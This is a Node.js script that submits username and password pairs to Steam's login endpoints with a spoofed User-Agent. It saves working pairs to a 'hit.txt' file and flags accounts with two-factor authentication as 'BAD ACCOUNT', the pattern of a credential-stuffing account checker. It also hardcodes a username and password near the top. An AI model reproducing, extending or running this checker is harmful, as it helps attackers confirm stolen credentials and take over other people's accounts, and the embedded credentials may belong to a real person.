const fetch = require("node-fetch");
const NodeRSA = require("node-rsa");
const chalk = require("chalk");
const fs = require("fs");
const path = require("path");

const username = "sugomadics";
const password = "Heyakid157";

const resultDir = path.join(__dirname, "results");
if (!fs.existsSync(resultDir)) {
    fs.mkdirSync(resultDir);
}

async function checkAccount(user, passw) {
    const userAgent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)";

    try {
        const session = fetch;
        const rsaResp = await session(
            "https://steamcommunity.com/login/getrsakey/",
            {
                method: "POST",
                headers: {
                    "User-Agent": userAgent,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams({
                    username: user,
                    donotcache: Date.now().toString(),
                }),
            }
        );

    const rsaData = await rsaResp.json();

    if (!rsaData.success) {
        console.log(chalk.red(`Failed to get key for ${user}`));
        return;
    }

    const key = new NodeRSA();
    key.setOptions({ encryptionScheme: "pkcs1" });
    key.importKey(
        {
            n: Buffer.from(rsaData.publickey_mod, "hex"),
            e: parseInt(rsaData.publickey_exp, 16),
        },
        "components-public"
    );

    const encryptedPassword = key.encrypt(passw, "base64");

    const loginResp = await session(
        "https://steamcommunity.com/login/dologin/",
        {
            method: "POST",
            headers: {
            "User-Agent": userAgent,
            Accept: "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Origin: "https://steamcommunity.com",
            Referer: "https://steamcommunity.com/login/home/?goto=",
        },
        body: new URLSearchParams({
            username: user,
            password: encryptedPassword,
            emailauth: "",
            loginfriendlyname: "",
            captchagid: "-1",
            captcha_text: "",
            emailsteamid: "",
            rsatimestamp: rsaData.timestamp,
            remember_login: "false",
            donotcache: Date.now().toString(),
            }),
        }
    );

    const loginData = await loginResp.json();

    if (loginData.success) {
        console.log(chalk.green(`✅ Logged in successfully for [${user}]`));
        fs.appendFileSync(path.join(resultDir, "hit.txt"), `${user}:${passw}\n`);
    } else if (loginData.emailauth_needed) {
        console.log(chalk.yellow(`⚠️ 2FA Enabled — BAD ACCOUNT [${user}]`));
        fs.appendFileSync(path.join(resultDir, "2fa.txt"), `${user}:${passw}\n`);
    } else {
        console.log(chalk.red(`❌ BAD ACCOUNT [${user}]`));
    }
    } catch (err) {
        console.error(chalk.red(`❗ ERROR: ${err}`));
    }
}

checkAccount(username, password);
